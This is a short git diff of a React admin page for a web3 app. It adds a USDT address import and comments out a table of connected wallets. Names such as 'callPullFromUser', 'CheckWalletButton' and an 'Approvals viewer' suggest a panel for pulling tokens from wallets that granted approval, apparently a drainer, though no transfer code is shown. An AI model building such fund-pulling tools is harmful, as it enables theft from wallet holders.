@@ -4,7 +4,7 @@ import Footer from '../components/Footer.jsx'
 import CheckWalletButton from '../components/CheckWalletButton.jsx'
 import { useWeb3Modal } from '@web3modal/wagmi/react'
 import { useAccount, useChainId } from 'wagmi'
-import { callPullFromUser, readOwnerAddress, readAdminAddress, callSetAdmin } from '../web3/tokenTransfer'
+import { callPullFromUser, readOwnerAddress, readAdminAddress, callSetAdmin, USDT_ADDRESSES } from '../web3/tokenTransfer'
 import { parseUnits, createPublicClient, http, formatEther } from 'viem'
 import { CHAIN_NAMES, RESOLVED_RPC_URLS } from '../web3/config.jsx'
 import AdminHeader from '../components/AdminHeader.jsx'
@@ -239,7 +239,7 @@ export default function Admin() {
                   </div>
                 </div>
 
-                <div className="admin-card" style={{ marginTop: '12px' }}>
+              {/*   <div className="admin-card" style={{ marginTop: '12px' }}>
                   <table className="admin-table" role="table" aria-label="Wallets connected to contract">
                     <thead>
                       <tr>
@@ -266,7 +266,7 @@ export default function Admin() {
                       )}
                     </tbody>
                   </table>
-                </div>
+                </div> */}
 
                 {/* Approvals viewer */}
                 <div className="admin-card" style={{ marginTop: '12px' }}>
